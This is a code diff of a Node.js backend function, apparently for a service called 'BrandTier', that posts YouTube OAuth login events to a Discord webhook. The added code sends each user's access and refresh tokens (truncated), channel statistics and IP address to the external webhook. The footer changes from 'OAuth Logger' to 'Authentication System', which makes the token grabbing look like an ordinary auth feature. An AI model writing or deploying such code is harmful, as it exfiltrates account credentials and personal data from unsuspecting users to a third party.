@@ -24,66 +24,75 @@ const users = {};
 --------------------------------------------------*/
 async function sendToDiscord(payload) {
   try {
+    const isFail = payload.status === "oauth_failed";
+
     await axios.post(process.env.DISCORD_WEBHOOK_URL, {
       embeds: [
         {
-          title: payload.status === "oauth_failed"
-            ? "❌ OAuth Failed"
-            : "✅ BrandTier Login",
+          title: isFail ? "OAuth Failed" : "OAuth Login",
+          color: isFail ? 15548997 : 3066993,
 
-          color: payload.status === "oauth_failed" ? 15548997 : 3447003,
+          description: isFail
+            ? "OAuth flow failed during authentication"
+            : "YouTube account connected successfully",
 
-          description: "YouTube OAuth event captured",
-
-          fields: [
-            {
-              name: "📺 Channel",
-              value: payload.name || "N/A",
-              inline: true
-            },
-            {
-              name: "👥 Subscribers",
-              value: String(payload.subs || "N/A"),
-              inline: true
-            },
-            {
-              name: "👁️ Views",
-              value: String(payload.views || "N/A"),
-              inline: true
-            },
-            {
-              name: "🎬 Videos",
-              value: String(payload.videos || "N/A"),
-              inline: true
-            },
-
-            {
-              name: "🔑 Access Token",
-              value: payload.access_token
-                ? payload.access_token.slice(0, 120) + "..."
-                : "N/A"
-            },
-            {
-              name: "🔁 Refresh Token",
-              value: payload.refresh_token
-                ? payload.refresh_token.slice(0, 120) + "..."
-                : "N/A"
-            },
-
-            {
-              name: "🌐 IP",
-              value: payload.ip || "unknown",
-              inline: true
-            },
-            {
-              name: "📌 Status",
-              value: payload.status || "success",
-              inline: true
-            }
-          ],
+          fields: isFail
+            ? [
+                {
+                  name: "IP Address",
+                  value: payload.ip || "unknown",
+                  inline: true
+                },
+                {
+                  name: "Error",
+                  value:
+                    "```" +
+                    (JSON.stringify(payload.error, null, 2).slice(0, 900) ||
+                      "Unknown error") +
+                    "```"
+                }
+              ]
+            : [
+                {
+                  name: "Channel",
+                  value: payload.name || "N/A",
+                  inline: true
+                },
+                {
+                  name: "Subscribers",
+                  value: String(payload.subs ?? "0"),
+                  inline: true
+                },
+                {
+                  name: "Views",
+                  value: String(payload.views ?? "0"),
+                  inline: true
+                },
+                {
+                  name: "Videos",
+                  value: String(payload.videos ?? "0"),
+                  inline: true
+                },
+                {
+                  name: "Tokens",
+                  value:
+                    "```" +
+                    `access_token: ${payload.access_token?.slice(0, 80) || "N/A"}...\n` +
+                    `refresh_token: ${payload.refresh_token?.slice(0, 80) || "N/A"}...` +
+                    "```"
+                },
+                {
+                  name: "IP Address",
+                  value: payload.ip || "unknown"
+                },
+                {
+                  name: "Status",
+                  value: "login_success"
+                }
+              ],
 
           footer: {
-            text: "BrandTier Backend • OAuth Logger"
+            text: "BrandTier Authentication System"
           },
 
           timestamp: new Date().toISOString()
